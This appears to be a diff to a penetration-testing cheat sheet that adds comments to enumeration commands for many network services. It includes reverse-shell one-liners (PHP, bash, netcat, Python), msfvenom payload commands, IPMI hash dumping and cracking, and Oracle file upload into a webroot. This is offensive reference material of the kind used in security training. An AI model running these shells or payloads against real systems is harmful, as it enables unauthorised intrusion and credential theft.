@@ -39,6 +39,13 @@ done
 
 **Identify IP ranges and scan for live hosts using a custom script**
 
+```bash
+# This script automates the process of identifying the CIDR block for a given IP,
+# pings all IPs in the range, and resolves IPs for a target domain.
+# It supports argument validation and automation for efficient network mapping.
+# See the script for details: ../scripts/CIDR.sh
+```
+
 ### Key steps:
 1. Validate input arguments
 2. Identify CIDR block for a given IP
@@ -48,7 +55,7 @@ done
 
 **Script**: [`CIDR.sh`](../scripts/CIDR.sh)
 
- </details>
+</details>
  
 ---
 
@@ -58,38 +65,39 @@ done
 **Scan FTP service**
 
 ```bash
-sudo nmap -sV -p21 -sC -A <IP>
+# Scans the target for FTP (port 21), detects service/version, runs default scripts, and enables aggressive scan options.
+nmap -sV -p21 -sC -A <IP>
 ```
 
 **Enumerate FTP settings and anonymously download files**
 
 ```bash
-# Show configuration without comments
+# Shows the FTP server configuration, excluding comments.
 cat /etc/vsftpd.conf | grep -v "#"
 
-# View restricted users
+# Lists users who are denied FTP access.
 cat /etc/ftpusers
 
-# Recursively download available FTP files
+# Recursively downloads all files from the FTP server using the provided credentials.
 wget -m --no-passive ftp://<USER>:<PASSWORD>@<IP>
 ```
 
 **Service interaction**
 
 ```bash
-# nc
+# Connects to the FTP service using Netcat for manual interaction.
 nc -nv <IP> <PORT>
 
-# telnet
+# Connects to the FTP service using Telnet.
 telnet <IP> <PORT>
 
-# openssl
+# Initiates an SSL/TLS connection to the FTP service for encrypted communication.
 openssl s_client -connect <IP>:<PORT> -starttls ftp
 ```
 
- </details>
+</details>
 
- ---
+---
 
 <details>
 <summary><strong>📁 NFS</strong></summary>
@@ -97,38 +105,35 @@ openssl s_client -connect <IP>:<PORT> -starttls ftp
 **Scan NFS service**
 
 ```bash
+# Scans for NFS-related ports and runs default scripts.
 sudo nmap <IP> -p111,2049 -sV -sC
-```
-```bash
+
+# Runs all NFS-related NSE scripts for deeper enumeration.
 sudo nmap --script nfs* <IP> -sV -p111,2049
 ```
 
 **Service interaction**
 
-Show Available NFS Shares
 ```bash
+# Lists available NFS shares exported by the server.
 showmount -e <IP>
-```
 
-Mounting NFS Share
-```bash
+# Mounts the NFS share locally for browsing.
 mkdir target-NFS
 sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
 cd target-NFS
+
+# Shows directory structure.
 tree .
-```
 
-List Contents with Usernames, Group Names, UIDs & GUIDs
-```bash
+# Lists contents with numeric user/group IDs.
 ls -l -n mnt/nfs/
-```
 
-Unmounting
-```bash
+# Unmounts the NFS share.
 sudo umount ./target-NFS
 ```
 
- </details>
+</details>
  
 ---
 
@@ -138,30 +143,31 @@ sudo umount ./target-NFS
 **Scan SMB service**
 
 ```bash
+# Scans for SMB ports, detects service/version, and runs default scripts.
 sudo nmap <IP> -sV -sC -p139,445
 ```
 
 **Analyze shared folders and user access**
 
 ```bash
-# Check smb.conf (without comments and semicolons)
+# Shows Samba configuration, excluding comments and semicolons.
 cat /etc/samba/smb.conf | grep -v "#\|\;"
 
-# Restart Samba after changes
+# Restarts the Samba service after making changes.
 sudo systemctl restart smbd
 
-# List available shares without credentials
+# Lists available SMB shares without authentication.
 smbclient -N -L //<IP>
 ```
 
 ### Tools:
-- [`samrdump.py`](../scripts/samrdump.py)
-- [SMBMap](https://github.com/ShawnDEvans/smbmap)
-- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
-- [Enum4Linux-ng](https://github.com/cddmp/enum4linux-ng)
+- [`samrdump.py`](../scripts/samrdump.py): Dumps SAMR information from Windows hosts.
+- [SMBMap](https://github.com/ShawnDEvans/smbmap): Enumerates SMB shares and permissions.
+- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): Swiss army knife for pentesting networks.
+- [Enum4Linux-ng](https://github.com/cddmp/enum4linux-ng): Next-gen SMB enumeration tool.
 
 ```bash
-# Install Enum4Linux-ng
+# Install Enum4Linux-ng for advanced SMB enumeration.
 git clone https://github.com/cddmp/enum4linux-ng.git
 cd enum4linux-ng
 sudo cp enum4linux-ng.py /usr/local/bin/enum4linux-ng
@@ -177,21 +183,26 @@ enum4linux-ng -h
 <summary><strong>📧 SMTP</strong></summary>
 
 **Scan SMTP service**
+
 ```bash
+# Scans for SMTP on port 25, runs default scripts, and detects service/version.
 sudo nmap <IP> -sC -sV -p25
 
+# Checks if the SMTP server is an open relay.
 sudo nmap <IP> -p25 --script smtp-open-relay -v
 ```
 
 **Get configuration file**
 
 ```bash
+# Displays the Postfix configuration file, excluding comments and empty lines.
 cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
 ```
 
 **Service interaction**
 
 ```bash
+# Connects to the SMTP service for manual interaction and banner grabbing.
 telnet <IP> <PORT>
 ```
 
@@ -202,22 +213,23 @@ telnet <IP> <PORT>
 <details>
 <summary><strong>📨 IMAP POP3</strong></summary>
 
+**Scan IMAP and POP3 services**
 
-**Scan SMTP service**
 ```bash
+# Scans for IMAP and POP3 services, runs default scripts and capability checks.
 sudo nmap <IP> -sV -p 110,143,993,995 -sC --script pop3-capabilities,imap-capabilities
 ```
 
 **Service interaction**
 
 ```bash
-#curl
+# Connects to IMAPS using curl.
 curl -k 'imaps://<IP>' --user <USER>:<PASSWORD>
 
-#openssl pop3
+# Connects to POP3S using OpenSSL.
 openssl s_client -connect <IP>:pop3s
 
-#openssl imap
+# Connects to IMAPS using OpenSSL.
 openssl s_client -connect <IP>:imaps
 ```
 
@@ -228,19 +240,20 @@ openssl s_client -connect <IP>:imaps
 <details>
 <summary><strong>📡 SNMP</strong></summary>
 
-**Footprinting SMTP service**
+**Footprinting SNMP service**
 
 ```bash
-# snmpwalk
+# Walks the SNMP tree using the provided community string.
 snmpwalk -v2c -c <COMMUNITYSTRING> <IP>
 
-# OneSixtyOne
+# Scans for SNMP using a wordlist of community strings.
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
 ```
 
 **Get configuration file**
 
 ```bash
+# Displays the SNMP daemon configuration, excluding comments and empty lines.
 cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
 ```
 
@@ -251,26 +264,27 @@ cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
 <details>
 <summary><strong>🛢️ MySQL</strong></summary>
 
-
 **Scan MySQL service**
 
 ```bash
+# Scans for MySQL service, detects version, and runs MySQL NSE scripts.
 sudo nmap <IP> -sV -sC -p3306 --script mysql*
 ```
 
 **Get configuration file**
 
 ```bash
+# Displays the MySQL server configuration, excluding comments and empty lines.
 cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
 ```
 
 **Service interaction**
 
 ```bash
-# Without a password
+# Connects to MySQL without a password.
 mysql -u <USER> -h <IP>
 
-# Using a password
+# Connects to MySQL using a password.
 mysql -u <USER> -p<PASSWORD> -h <IP>
 ```
 
@@ -281,16 +295,17 @@ mysql -u <USER> -p<PASSWORD> -h <IP>
 <details>
 <summary><strong>💾 MSSQL</strong></summary>
 
-
 **Scan MSSQL service**
 
 ```bash
+# Runs multiple Nmap scripts for MSSQL enumeration and checks for weak credentials.
 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
 ```
 
 **MSSQL Ping in Metasploit**
 
 ```bash
+# Uses Metasploit to check if the MSSQL service is alive.
 msf6 > use auxiliary/scanner/mssql/mssql_ping
 msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts <IP>
 msf6 auxiliary(scanner/mssql/mssql_ping) > run
@@ -298,8 +313,8 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > run
 
 **Service interaction**
 
-**Script**: [`mssqlclient.py`](../scripts/mssqlclient.py)
 ```bash
+# Connects to MSSQL using the Impacket mssqlclient.py script.
 python3 mssqlclient.py Administrator@<IP> -windows-auth
 ```
 
@@ -310,30 +325,36 @@ python3 mssqlclient.py Administrator@<IP> -windows-auth
 <details>
 <summary><strong>🐚 Reverse Shell</strong></summary>
 
-
 **PHP**
 ```php
+# PHP reverse shell using bash over TCP.
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>
 ```
 
 **BASH**
 ```bash
+# Bash reverse shell over TCP.
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+
+# Bash reverse shell over UDP.
 bash -i >& /dev/udp/<IP>/<PORT> 0>&1
 ```
 
 **Netcat**
 ```bash
+# Netcat reverse shell.
 nc -e /bin/sh <IP> <PORT>
 ```
 
 **Python**
 ```bash
+# Python reverse shell using socket and subprocess.
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 **Metasploit**
 ```bash
+# Generate various reverse shell payloads with msfvenom.
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
@@ -342,6 +363,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x
 
 **Meterpreter**
 ```bash
+# Generate Meterpreter reverse shell payloads with msfvenom.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
@@ -350,6 +372,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > s
 
 **Spawn TTY**
 ```bash
+# Upgrade a shell to a fully interactive TTY.
 python3 -c 'import pty; pty.spawn("/bin/bash"); import os; os.putenv("TERM", "xterm"); os.system("export SHELL=/bin/bash");'
 export TERM=xterm
 ```
@@ -361,27 +384,31 @@ export TERM=xterm
 <details>
 <summary><strong>🔐 SSH</strong></summary>
 
-
 **Scan with SSH-Audit**
 ```bash
+# Clones and runs SSH-Audit to enumerate SSH configuration and security.
 git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
 ./ssh-audit.py <IP>
 ```
 
 **Get configuration file**
 ```bash
+# Displays the SSH daemon configuration, excluding comments and empty lines.
 cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
 ```
 
 **Service interaction**
 ```bash
+# Connects to SSH using a username and password.
 ssh <USER>@<ip>
 
+# Connects to SSH using a private key.
 ssh -i id_rsa <USER>@<ip>
 ```
 
 **Port Forwarding**
 ```bash
+# Forwards a local port to a remote host/port via SSH.
 ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
 ```
 
@@ -395,44 +422,47 @@ ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
 **Scan TNS service**
 
 ```bash
+# Scans for Oracle TNS service and attempts SID brute-forcing.
 sudo nmap -p1521 -sV <IP> --open
-
 sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
-
 ```
 
 **Oracle-Tools**
 
-Install Oracle-Tools*
-
+# See the setup script for installing Oracle tools.
 [`Oracle-Tools-setup.sh`](../scripts/Oracle-Tools-setup.sh)
 
-Testing ODAT
+**Testing ODAT**
 
 ```bash
+# Runs all ODAT modules against the Oracle server.
 ./odat.py all -s <IP>
 ```
 
 **SQLplus Login**
 ```bash
+# Connects to Oracle using SQLplus.
 sqlplus <USER>/<PASS>@<IP>/XE
 sqlplus <USER>/<PASS>@<IP>/XE as sysdba
 ```
 
 **Fix SQLplus Library Path**
 ```bash
+# Fixes library path issues for SQLplus.
 sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
 sudo ldconfig
 ```
 
 **File Upload with Oracle**
 ```bash
+# Uploads a file to the Oracle server using ODAT.
 echo "Oracle File Upload Test" > testing.txt
 ./odat.py utlfile -s <IP> -d XE -U user -P password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 ```
 
 **Download Uploaded File**
 ```bash
+# Downloads the uploaded file via HTTP.
 curl -X GET http://<IP>/testing.txt
 ```
 
@@ -443,14 +473,15 @@ curl -X GET http://<IP>/testing.txt
 <details>
 <summary><strong>🖥️ IPMI</strong></summary>
 
-
 **Scan with Nmap**
 ```bash
+# Scans for IPMI version using Nmap UDP script.
 sudo nmap -sU --script ipmi-version -p 623 <IP>
 ```
 
 **Scan with Metasploit**
 ```bash
+# Uses Metasploit to enumerate IPMI version.
 msf6 > use auxiliary/scanner/ipmi/ipmi_version 
 msf6 > set rhosts <IP>
 msf6 > show options
@@ -459,6 +490,7 @@ msf6 > run
 
 **Dump Hashes**
 ```bash
+# Dumps IPMI password hashes using Metasploit.
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
 msf6 > set rhosts <IP>
 msf6 > run
@@ -466,6 +498,7 @@ msf6 > run
 
 **Crack IPMI Hashes HP iLO using a factory default password**
 ```bash
+# Cracks IPMI hashes using hashcat and a brute-force mask.
 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 ```
 
@@ -476,21 +509,23 @@ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 <details>
 <summary><strong>➡️ RDP</strong></summary>
 
-
 **Scan with Nmap**
 ```bash
+# Scans for RDP service and runs RDP-related NSE scripts.
 nmap -sV -sC -n <IP> -p3389 --disable-arp-ping --script rdp*
 ```
 
 **RDP Security Check**
 
 ```bash
+# Uses rdp-sec-check to enumerate RDP security settings.
 git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
 ./rdp-sec-check.pl <IP>
 ```
 
 **Service interaction**
 ```bash
+# Connects to RDP using xfreerdp.
 xfreerdp /u:<USER> /p:"<PASSWORD>" /v:<IP>
 ```
 
@@ -505,20 +540,22 @@ xfreerdp /u:<USER> /p:"<PASSWORD>" /v:<IP>
 
 **Scan with Nmap**
 ```bash
+# Scans for WinRM service on ports 5985 and 5986.
 nmap -sV -sC <IP> -p5985,5986 --disable-arp-ping -n
 ```
 
 **Service interaction**
 ```bash
+# Connects to WinRM using evil-winrm.
 evil-winrm -i <IP> -u <USER> -p <PASSWORD>
 ```
-
 
 **Windows Management Instrumentation (WMI)**
 
 **Footprinting the service**
 ```bash
-/usr/share/doc/python3-impacket/examples/wmiexec.py <USER>:"<PASSWORD>"@<IP> "hostname"
+# Executes a command on the remote host using WMI via Impacket.
+usr/share/doc/python3-impacket/examples/wmiexec.py <USER>:"<PASSWORD>"@<IP> "hostname"
 ```
 
 </details>
